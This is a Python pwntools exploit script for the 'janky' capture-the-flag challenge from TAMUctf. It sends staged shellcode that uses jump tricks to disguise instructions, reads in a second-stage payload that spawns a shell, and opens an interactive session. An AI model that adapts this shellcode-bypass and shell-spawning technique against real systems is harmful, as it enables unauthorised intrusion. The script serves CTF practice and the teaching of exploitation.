#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('janky_patched')
# context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
libc = exe.libc 

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote("tamuctf.com", 443, ssl=True, sni="janky")
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+102
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    skip = asm("""
    jmp skip+1
    skip:
    """)

    set_rdi_rsi = asm("""
    push rdx
    pop rsi
    xor edi, edi
    """)

    set_rdx = asm("""
    mov al, 255
    mov edx, eax
    """)

    set_rax_syscall = asm("""
    xor eax, eax
    syscall
    """)

    sc = skip + b"\xe9" + set_rdi_rsi +  skip + b"\xe9" + set_rdx + skip + b"\xe9" + set_rax_syscall

    io.send(sc)
    io.send(b"a" * len(sc) + asm(shellcraft.sh()))

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

